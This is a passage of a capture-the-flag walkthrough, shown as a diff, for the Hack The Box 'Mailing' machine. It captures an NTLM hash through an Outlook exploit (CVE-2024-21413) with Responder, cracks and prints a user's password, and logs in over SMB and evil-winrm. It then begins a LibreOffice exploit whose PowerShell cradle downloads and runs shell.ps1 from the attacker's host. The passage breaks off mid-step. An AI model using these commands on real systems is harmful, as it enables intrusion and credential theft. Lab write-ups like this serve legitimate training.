@@ -190,10 +190,52 @@ The Windows server is running a mail server, as we saw from the instructions.pdf
 
 Searching online for CVE for Windows Mail, I found CVE-2024-21413 alongside a PoC in GitHub https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/blob/main/README.md. To use this PoC we also need someone to recieve the email we are going to send. Going back to the website we can see some employee names listed over there:
 <img width="813" height="387" alt="image" src="https://github.com/user-attachments/assets/acbed4ca-1147-4f87-8fd5-4fc7460eb440" />
-Let's try targeting Maya from support:
+Let's try targeting Maya from support. First set up responder to listen to our vpn(tun0) so we can capture the NTLM key:
 ```bash
+sudo responder -I tun0
+```
+After that we only have to make a small modification on the poc code. First remove the line:
+```bash
+        <img src="{base64_image_string}" alt="Image"><br />
+```
+Then also delete this variable and it's content:  base64_image_string
 
+After that is done, execute the PoC:
+```bash
+python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\<your-ip>\test\meeting" --subject test
+```
+After a minute or so, responder should have the ntlmv2 hash:
+<img width="1893" height="243" alt="image" src="https://github.com/user-attachments/assets/605dbfc6-c4cc-4033-af04-9d0dbbfdc3c0" />
 
+Save it to a file and crack it with john:
+<img width="1105" height="181" alt="image" src="https://github.com/user-attachments/assets/7bbeb667-2430-4e63-ba30-4766a7c01063" />
 
+The cracked password is: m4y4ngs4ri for the maya user.
+Let's see if we can aceess more info over on smb using the credentials we found. Let's enumerate shares first:
+```bash
+smbclient -L //<machine-ip> -U maya%m4y4ngs4ri
+```
+<img width="1916" height="190" alt="image" src="https://github.com/user-attachments/assets/7e6375ef-5f68-4524-8c3d-cc9da9f8c6e7" />
 
+Ok, Important Documents seems, well, pretty important. Let's check it out:
+```bash
+```
+There is nothing there, let's try it over at evil-winrm, and it works:
+<img width="1912" height="237" alt="image" src="https://github.com/user-attachments/assets/863e20eb-3a3c-465d-8e8c-20479c45aef0" />
 
+We can see that LibreOffice is installed, the .ini file is located inside the programs directory:
+<img width="1917" height="252" alt="image" src="https://github.com/user-attachments/assets/20f55c6a-7dbb-4b36-9dee-32528c73692d" />
+
+Version for LibreOffice is 7.4.0.1 if we look online we'll find the following CVE: CVE-2023-2255. basically this creates a malicious file that when executed with libreoffice'll execute a command of our choosing. First we clone the repository:
+```bash
+git clone https://github.com/elweth-sec/CVE-2023-2255.git
+```
+Then execute the following commands:
+```bash
+echo IEX(New-Object Net.WebClient).downloadString('http://<your-ip>:8000/shell.ps1') > cradle
+cat cradle | iconv -t utf-16le | base64 -w 0
+```
+This should output a base64 code:
+<img width="1912" height="83" alt="image" src="https://github.com/user-attachments/assets/cf6620ad-98c4-4c3a-9c83-1cba2fe46bb1" />
+
+Next, copy the base64 code and
